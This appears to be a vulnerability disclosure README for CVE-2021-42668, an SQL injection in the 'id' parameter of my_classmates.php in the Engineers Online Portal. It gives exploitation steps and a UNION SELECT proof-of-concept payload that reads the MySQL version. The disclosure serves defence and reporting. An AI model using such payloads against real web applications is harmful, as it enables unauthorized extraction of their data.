# cve-2021-42668
CVE-2021-42668 - SQL Injection vulnerability in the Engineers online portal system. 

# Technical description:
An SQL Injection vulnerability exists in the Engineers Online Portal. An attacker can leverage the vulnerable "id" parameter in the "my_classmates.php" web page in order to manipulate the sql query performed.
As a result the attacker can extract sensitive data from the web server.

Affected components - 

Vulnerable page - my_classmates.php

Vulnerable parameter - "id"

# Steps to exploit:
1) Navigate to http://localhost/nia_munoz_monitoring_system/my_classmates.php
2) Insert your payload in the id parameter

# Proof of concept (Poc) -
The following payload will allow you to extract the MySql server version running on the web server -
```
' union select NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
```

![CVE-2021-42668](https://user-images.githubusercontent.com/93016131/140190507-39c3361e-6ebd-4eed-9016-e9a6be6bd2db.gif)

# References - 
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42668

https://nvd.nist.gov/vuln/detail/CVE-2021-42668

# Discovered by - 
Alon Leviev(0xDeku), 22 October, 2021. 
